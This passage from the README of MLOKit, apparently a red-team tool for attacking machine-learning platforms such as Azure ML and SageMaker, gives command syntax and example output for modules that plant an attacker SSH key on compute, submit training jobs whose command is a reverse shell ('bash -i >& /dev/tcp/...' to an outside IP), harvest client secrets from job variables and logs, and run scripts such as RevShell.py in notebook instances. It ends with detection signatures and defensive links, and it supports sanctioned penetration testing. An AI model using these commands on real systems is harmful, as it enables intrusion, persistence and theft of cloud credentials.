`MLOKit.exe list-compute /platform:azureml /credential:eyJ... /subscription-id:[someSubscriptionID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME]`

##### Example Output

```

C:\>MLOKit.exe list-compute /platform:azureml /credential:%CRED% /subscription-id:47c5aaab-dbda-44ca-802e-00801de4db23 /region:eastus /resource-group:testazureml /workspace:Test-Workspace

==================================================
Module:         list-compute
Platform:       azureml
Timestamp:      9/4/2025 9:09:16 AM
==================================================


[*] INFO: Performing list-compute module for azureml

[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

                          Name |      State |       Public IP |         SSH Username |   SSH Port |                 Public SSH Key
----------------------------------------------------------------------------------------------------------------------------------
          trainingcompute34029 |    Running | 172.191.190.197 |            azureuser |      50000 | uLZqG6PktE= generated-by-azure
        trainingcompute4211145 |    Running |  172.191.121.17 |            azureuser |      50000 | uLZqG6PktE= generated-by-azure

```

### List Training Jobs

#### Use Case

> *List the training jobs that have run*

#### Syntax

Supply the `list-training-jobs` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument.

If you would like to filter for a specific job name, specify the job name within the `/job-name:` command argument.

##### SageMaker

`MLOKit.exe list-training-jobs /platform:sagemaker /credential:[ACCESS_KEY;SECRET_KEY] /region:[REGION_NAME]`

##### Azure ML

`MLOKit.exe list-training-jobs /platform:azureml /credential:eyJ... /subscription-id:[someSubscriptionID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME]`

`MLOKit.exe list-training-jobs /platform:azureml /credential:eyJ... /subscription-id:[someSubscriptionID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME] /job-name:[JOB_NAME]`

##### Example Output

```

C:\>MLOKit.exe list-training-jobs /platform:azureml /credential:%CRED% /subscription-id:47c5aaab-dbda-44ca-802e-00801de4db23 /region:eastus /resource-group:testazureml /workspace:Test-Workspace

==================================================
Module:         list-training-jobs
Platform:       azureml
Timestamp:      9/4/2025 10:43:06 AM
==================================================


[*] INFO: Performing list-training-jobs module for azureml

[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

                          Name |     Status |                     Experiment |       Compute Target |   Job Type |      Job Output Type |          Environment
--------------------------------------------------------------------------------------------------------------------------------------------------------------
                 totally-legit |   Canceled |                  totally-legit |          cpu-cluster |    Command |           uri_folder | environments/salary-env/versions/1
                salary-train-5 |  Completed |                   salary-exp-5 |          cpu-cluster |    Command |           uri_folder | environments/salary-env/versions/1
        placid_tent_60pjnh37xw |  Completed |                   salary-exp-4 |          cpu-cluster |    Command |           uri_folder | environments/salary-env/versions/1
                salary-train-4 |  Completed |                   salary-exp-4 |          cpu-cluster |    Command |           uri_folder | environments/salary-env/versions/1
                salary-train-3 |  Completed |                   salary-exp-3 |          cpu-cluster |    Command |           uri_folder | environments/salary-env/versions/1
                salary-train-2 |  Completed |                   salary-exp-2 |          cpu-cluster |    Command |           uri_folder | environments/salary-env/versions/1
                  salary-train |     Failed |                     salary-exp |          cpu-cluster |    Command |           uri_folder | environments/salary-env/versions/1
         kind_guava_06ftffx2s2 |  Completed |       heart-failure-experiment |           Serverless |     AutoML |                      |                 None
        helpful_leg_n2slbwmckq |  Completed |              salary-experiment |           Serverless |     AutoML |                      |                 None
          teal_wire_gd269cbrzq |   Canceled |            diabetes-experiment |      compute-azureml |     AutoML |                      |                 None

```

### Add SSH Key

#### Use Case

> *Add SSH public key to ML compute*

#### Syntax

Supply the `add-ssh-key` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument. Finally, add the compute target name in the `/compute-id:` argument and the public SSH key in the `/ssh-key:` argument.

##### Azure ML

`MLOKit.exe add-ssh-key /platform:azureml /credential:[CREDENTIAL] /subscription-id:[SUBSCRIPTION_ID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME] /ssh-key:"[SSH_KEY]" /compute-id:[COMPUTE_NAME]`

##### Example Output

```

C:\>MLOKit.exe add-ssh-key /platform:azureml /credential:%CRED% /subscription-id:47c5aaab-dbda-44ca-802e-00801de4db23 /region:eastus /resource-group:testazureml /workspace:Test-Workspace /ssh-key:"SSH PUB KEY CONTENTS" /compute-id:trainingcompute4211145

==================================================
Module:         add-ssh-key
Platform:       azureml
Timestamp:      9/4/2025 4:10:33 PM
==================================================


[*] INFO: Performing add-ssh-key module for azureml

[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

[*] INFO: Listing compute instance where SSH key will be added

                          Name |      State |       Public IP |         SSH Username |   SSH Port |                 Public SSH Key
----------------------------------------------------------------------------------------------------------------------------------
        trainingcompute4211145 |    Stopped |  172.191.121.17 |            azureuser |      50000 | uLZqG6PktE= generated-by-azure

[*] INFO: Adding SSH Key to compute instance

[+] SUCCESS: Successfully added SSH key to compute instance

[*] INFO: Restarting compute instance

[*] INFO: Starting compute instance

[+] SUCCESS: Successfully initiated start request for compute instance

[*] INFO: Sleeping for 3 minutes to allow time for compute instance to restart

                          Name |      State |       Public IP |         SSH Username |   SSH Port |                 Public SSH Key
----------------------------------------------------------------------------------------------------------------------------------
        trainingcompute4211145 |    Running |  172.191.121.17 |            azureuser |      50000 | zIRxqr2mKirrl attacker-ssh-key

[+] SUCCESS: Compute instance successfully restarted

```


### Create Training Job

#### Use Case

> *Create a training job to execute specified code*

#### Syntax

Supply the `create-training-job` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument. Finally, add the path to your config file in the `/training-job-config:` argument.

##### Azure ML

`MLOKit.exe create-training-job /platform:azureml /credential:[CREDENTIAL] /subscription-id:[SUBSCRIPTION_ID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME] /training-job-config:[PATH_TO_CONFIG]`

##### Example Azure ML Training Job Config - Serverless Execution

```
$schema: https://azuremlschemas.azureedge.net/latest/commandJob.schema.json
type: command
name: [ANYTHING_HERE]
display_name: [ANYTHING_HERE]
experiment_name: [ANYTHING_HERE]

command: >-
  [REVERSE_SHELL]
environment: [ENVIRONMENT_NAME]
outputs:
  model:
    type: [TYPE]

```

##### Example Azure ML Training Job Config - Non-Serverless Execution (e.g., compute cluster)

```
$schema: https://azuremlschemas.azureedge.net/latest/commandJob.schema.json
type: command
name: [ANYTHING_HERE]
display_name: [ANYTHING_HERE]
experiment_name: [ANYTHING_HERE]

command: >-
  [REVERSE_SHELL]
environment: [ENVIRONMENT_NAME]
compute: [CPU_CLUSTER_NAME]
outputs:
  model:
    type: [TYPE]
resources:
  instance_count: 1

```

##### Example Output

```

C:\>MLOKit.exe create-training-job /platform:azureml /credential:%CRED% /subscription-id:47c5aaab-dbda-44ca-802e-00801de4db23 /region:eastus /resource-group:testazureml /workspace:Test-Workspace /training-job-config:C:\Users\hawk\Downloads\malicious_job.yml

==================================================
Module:         create-training-job
Platform:       azureml
Timestamp:      9/5/2025 1:29:34 PM
==================================================


[*] INFO: Performing create-training-job module for azureml

[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

[*] INFO: Validating config file supplied exists

[+] SUCCESS: Configuration file supplied exists

[*] INFO: Creating training job

{"properties": {"properties": {}, "tags": {}, "displayName": "MLOKit-HqfmCfim", "experimentName": "MLOKit-HqfmCfim", "isArchived": false, "jobType": "command", "command": "bash -i >& /dev/tcp/3.144.115.1/50111 0>&1", "environmentId": "/subscriptions/47c5aaab-dbda-44ca-802e-00801de4db23/resourceGroups/testazureml/providers/Microsoft.MachineLearningServices/workspaces/Test-Workspace/environments/salary-env/versions/1", "environmentVariables": {}, "inputs": {}, "outputs": {"model": {"jobOutputType": "uri_folder"}}, "resources": {"instanceCount": 1, "properties": {}}}}

[+] SUCCESS:Training job created successfully

```


### Get Training Job Variables

#### Use Case

> *Get all training jobs that have any variables present (could contain credentials)*

#### Syntax

Supply the `get-training-job-vars` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument.


##### SageMaker

`MLOKit.exe get-training-job-vars /platform:sagemaker /credential:[ACCESS_KEY;SECRET_KEY] /region:[REGION_NAME]`


##### Azure ML

`MLOKit.exe get-training-job-vars /platform:azureml /credential:eyJ... /subscription-id:[someSubscriptionID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME]`


##### Example Output

```

C:\>MLOKit.exe get-training-job-vars /platform:azureml /credential:%CRED% /subscription-id:47c5aaab-dbda-44ca-802e-00801de4db23 /region:eastus /resource-group:testazureml /workspace:Test-Workspace

==================================================
Module:         get-training-job-vars
Platform:       azureml
Timestamp:      9/8/2025 10:26:55 AM
==================================================


[*] INFO: Performing get-training-job-vars module for azureml

[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

[*] INFO: Only displaying training jobs that have job variables present

Training Job Name - c2d0d72b-424a-4e8f-8320-87b2038bb346
Training Job Variables - {"compute":"testingComputefadsfasf","Environment variables":"{\r\n\r\n\"AZURE_CLIENT_ID\": \"ABC123\",\r\n\"AZURE_CLIENT_SECRET\": \"AB.....\"\r\n\r\n}"}

Training Job Name - 2b489ff8-16f1-4f61-83ae-9799f3ff2ab3
Training Job Variables - {"max_epocs":"10","learning_rate":"0.01","learning_rate_schedule":"time-based"}

Training Job Name - c64bcfff-a675-4cbd-aa06-772694d9ac46
Training Job Variables - {"max_epocs":"10","learning_rate":"0.01","learning_rate_schedule":"time-based"}

Training Job Name - 31891701-235c-491a-9ba7-583e8c111871
Training Job Variables - {"max_epocs":"10","learning_rate":"0.01","learning_rate_schedule":"time-based"}

Training Job Name - 7298f906-523c-4d51-b4bc-276961758be1
Training Job Variables - {"max_epocs":"10","learning_rate":"0.01","learning_rate_schedule":"time-based","Environment variables":"{\r\n\r\n\"AZURE_TENANT_ID\": \"ABC123\",\r\n\"AZURE_CLIENT_ID\": \"ABC123\",\r\n\"AZURE_CLIENT_SECRET\": \"AB.....\"\r\n\r\n}"}

Training Job Name - b1a4eaa4-675a-486f-ad37-462529e2fd06
Training Job Variables - {"Environment variables":"{\r\n\r\n\"AZURE_TENANT_ID\": \"ABC123\",\r\n\"AZURE_CLIENT_ID\": \"ABC123\",\r\n\"AZURE_CLIENT_SECRET\": \"AB.....\"\r\n\r\n}"}

Training Job Name - 988e3de6-4236-4505-ab56-bc1d9d8e8666
Training Job Variables - {"Environment variables":"{\r\n\r\n\"AZURE_TENANT_ID\": \"ABC123\",\r\n\"AZURE_CLIENT_ID\": \"ABC123\",\r\n\"AZURE_CLIENT_SECRET\": \"AB.....\"\r\n\r\n}"}

Training Job Name - 2f425769-6979-4174-b713-7836a98fb164
Training Job Variables - {"Environment variables":"{\r\n\r\n    \"AZURE_TENANT_ID\": \"ABC123\",\r\n    \"AZURE_CLIENT_ID\": \"ABC123\",\r\n    \"AZURE_CLIENT_SECRET\": \"AB.....\"\r\n}"}

```


### Search Training Job Logs

#### Use Case

> *Searching training job logs for a given search string (could contain credentials)*

#### Syntax

Supply the `search-training-job-logs` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument.

If you would like to filter for a specific job name, specify the job name within the `/job-name:` command argument. Otherwise, you can do `/job-name:all` to search all training jobs.


##### Azure ML

`MLOKit.exe search-training-job-logs /platform:azureml /credential:eyJ... /subscription-id:[someSubscriptionID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME] /job-name:all`

`MLOKit.exe search-training-job-logs /platform:azureml /credential:eyJ... /subscription-id:[someSubscriptionID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME] /job-name:[JOB_NAME]`

##### Example Output

```

C:\>MLOKit.exe search-training-job-logs /platform:azureml /credential:%CRED% /subscription-id:47c5aaab-dbda-44ca-802e-00801de4db23 /region:eastus /resource-group:testazureml /workspace:Test-Workspace /job-name:all /search:"AZURE_CLIENT"

==================================================
Module:         search-training-job-logs
Platform:       azureml
Timestamp:      9/8/2025 3:19:59 PM
==================================================


[*] INFO: Performing search-training-job-logs module for azureml

[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

[*] INFO: Listing training job where logs will be searched

                                    Name |     Status |       Compute Target |   Job Type |      Job Output Type |            Datastore
---------------------------------------------------------------------------------------------------------------------------------------
                         MLOKit-sgVURWbi |  Completed |          cpu-cluster |    Command |           uri_folder | workspaceartifactstore

---------------SNIP---------------

                                    Name |     Status |       Compute Target |   Job Type |      Job Output Type |            Datastore
---------------------------------------------------------------------------------------------------------------------------------------
                          salary-train-5 |  Completed |          cpu-cluster |    Command |           uri_folder | workspaceartifactstore

[+] SUCCESS: MATCH on search string of AZURE_CLIENT - Downloading Log File with the match

[ENV] AZURE_CLIENT_SECRET=flasdkjfasl;kfjasdl;fkjsaflk

[*] INFO: std_log.txt written to: C:\source\MLOKit-Updates\MLOKit\bin\Release\MLOKit-mtkQBFmK



[+] SUCCESS: MATCH on search string of AZURE_CLIENT - Downloading Log File with the match

[ENV] AZURE_CLIENT_ID=123123-123123-123123-123123

[*] INFO: std_log.txt written to: C:\source\MLOKit-Updates\MLOKit\bin\Release\MLOKit-mtkQBFmK



                                    Name |     Status |       Compute Target |   Job Type |      Job Output Type |            Datastore
---------------------------------------------------------------------------------------------------------------------------------------
                  placid_tent_60pjnh37xw |  Completed |          cpu-cluster |    Command |           uri_folder | workspaceartifactstore

                                    Name |     Status |       Compute Target |   Job Type |      Job Output Type |            Datastore
---------------------------------------------------------------------------------------------------------------------------------------
                          salary-train-4 |  Completed |          cpu-cluster |    Command |           uri_folder | workspaceartifactstore

---------------SNIP---------------

```

### List Environments

#### Use Case

> *List available environments*

#### Syntax

Supply the `list-environments` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument.


##### Azure ML

`MLOKit.exe list-environments /platform:azureml /credential:eyJ... /subscription-id:[someSubscriptionID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME]`

##### Example Output

```

C:\>MLOKit.exe list-environments /platform:azureml /credential:%CRED% /subscription-id:47c5aaab-dbda-44ca-802e-00801de4db23 /region:eastus /resource-group:testazureml /workspace:Test-Workspace

==================================================
Module:         list-environments
Platform:       azureml
Timestamp:      9/9/2025 9:35:30 AM
==================================================


[*] INFO: Performing list-environments module for azureml

[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

[*] INFO: Only listing environments with custom Docker build images

                                              Name |     Docker File Path |                                                                 Docker Build URL
------------------------------------------------------------------------------------------------------------------------------------------------------------
                               custom-training-env |           Dockerfile | [URL]
                      pkg-taxifare-output-model-v1 |           Dockerfile | [URL]


```


### Get Environment Configs

#### Use Case

> *Download Docker build files for environments (could contain credentials)*

#### Syntax

Supply the `get-environment-configs` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument.

If you would like to filter for a specific environment name, specify the environment name within the `/environment-name:` command argument. Otherwise, you can do `/environment-name:all` to target all environments.


##### Azure ML

`MLOKit.exe get-environment-configs /platform:azureml /credential:eyJ... /subscription-id:[someSubscriptionID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME] /environment-name:all`

`MLOKit.exe get-environment-configs /platform:azureml /credential:eyJ... /subscription-id:[someSubscriptionID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME] /environment-name:[ENVIRONMENT_NAME]`

##### Example Output

```

C:\>MLOKit.exe get-environment-config /platform:azureml /credential:%CRED% /subscription-id:47c5aaab-dbda-44ca-802e-00801de4db23 /region:eastus /resource-group:testazureml /workspace:Test-Workspace /environment-name:"all"

==================================================
Module:         get-environment-config
Platform:       azureml
Timestamp:      9/9/2025 9:21:30 AM
==================================================


[*] INFO: Performing get-environment-config module for azureml

[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

[*] INFO: Only listing environments with custom Docker build images

                                              Name |     Docker File Path |                                                                 Docker Build URL
------------------------------------------------------------------------------------------------------------------------------------------------------------
                               custom-training-env |           Dockerfile | [URL]

[+] SUCCESS: Docker build file written to: C:\Temp\custom-training-env-Dockerfile


                                              Name |     Docker File Path |                                                                 Docker Build URL
------------------------------------------------------------------------------------------------------------------------------------------------------------
                      pkg-taxifare-output-model-v1 |           Dockerfile | [URL]

[+] SUCCESS: Docker build file written to: C:\Temp\pkg-taxifare-output-model-v1-Dockerfile



```



### Execute Code within Notebook Instance

#### Use Case

> *Execute code within a JupyterLab environment within a notebook instance*

#### Syntax

Supply the `exec-notebook-code` module, along with the MLOps platform in the `/platform:` command argument.  Additionally, provide a credential in the `/credential:` command argument and a notebook to target in the `/notebook-name:` argument. Finally, add a path to a script file you would like to execution within the notebook environment cloud compute via the `/script:` command argument.


##### Azure ML

For Azure ML, ensure you supply the associated compute ID for a notebook instance with the `/compute-id:` command argument.

`MLOKit.exe exec-notebook-code /platform:azureml /credential:[CREDENTIAL] /subscription-id:[SUBSCRIPTION_ID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME] /compute-id:[COMPUTE_ID] /script:[PATH_TO_SCRIPT]`

##### SageMaker

`MLOKit.exe exec-notebook-code /platform:sagemaker /credential:[ACCESS_KEY;SECRET_KEY] /region:[REGION_NAME] /notebook-name:[NOTEBOOK_NAME] /script:[PATH_TO_SCRIPT]`

##### Example Output

```

C:\>MLOKit.exe exec-notebook-code /platform:sagemaker /credential:%CRED% /region:us-east-2 /notebook-name:notebookTestBrett /script:RevShell.py

==================================================
Module:         exec-notebook-code
Platform:       sagemaker
Timestamp:      9/12/2025 11:51:50 AM
==================================================


[*] INFO: Performing exec-notebook-code module for sagemaker

[*] INFO: Checking credentials provided

                               Kernel ID |                    Kernel Name |           State
-------------------------------------------------------------------------------------------
    175bac38-aebb-4fcb-893d-0bc79bc58c84 |         conda_tensorflow2_p310 |            idle

[*] INFO: Kernel ID to target: 175bac38-aebb-4fcb-893d-0bc79bc58c84

[*] INFO: Connected to Notebook instance via WebSocket

[*] INFO: Executing script against Notebook instance


[*] INFO: Response Status for Execution: ok

[+] SUCCESS: Execution Completed

```


## Detection

Below are static signatures for the specific usage of this tool in its default state:

* Project GUID - `{32D508EE-ADFF-4553-A5E6-300E8DF64434}`
  * See [MLOKit Yara Rule](Detections/MLOKit.yar) in this repo.
* User Agent String - `MLOKit-e977ac02118a3cb2c584d92a324e41e9`
  * See [MLOKit Snort Rule](Detections/MLOKit.rules) in this repo.

For detection guidance of the techniques used by the tool, see the below resources
* [X-Force Red whitepaper](https://www.ibm.com/downloads/documents/us-en/11630e2cbc302316)
* [X-Force Red blog post](https://www.ibm.com/think/x-force/becoming-the-trainer-attacking-ml-training-infrastructure)
* KQL Queries - https://github.com/h4wkst3r/KQL-Queries
* CloudTrail Queries - https://github.com/h4wkst3r/CloudTrail-Queries


## References

### X-Force Red Research
* https://www.ibm.com/downloads/documents/us-en/11630e2cbc302316
* https://www.ibm.com/think/x-force/becoming-the-trainer-attacking-ml-training-infrastructure

### Azure ML REST API
* https://learn.microsoft.com/en-us/rest/api/azureml/?view=rest-azureml-2023-10-01

### Azure Blob Storage REST API
* https://learn.microsoft.com/en-us/rest/api/storageservices/blob-service-rest-api

### BigML REST API
* https://bigml.com/api/

### MLFlow REST API
* https://mlflow.org/docs/latest/rest-api.html

### Vertex AI REST API
* https://cloud.google.com/vertex-ai/docs/reference/rest

### Google Cloud Storage REST API
* https://cloud.google.com/storage/docs/apis

### Amazon SageMaker REST API
* https://docs.aws.amazon.com/sagemaker/latest/dg/api-and-sdk-reference.html

### Amazon S3 REST API
* https://docs.aws.amazon.com/AmazonS3/latest/API/Type_API_Reference.html
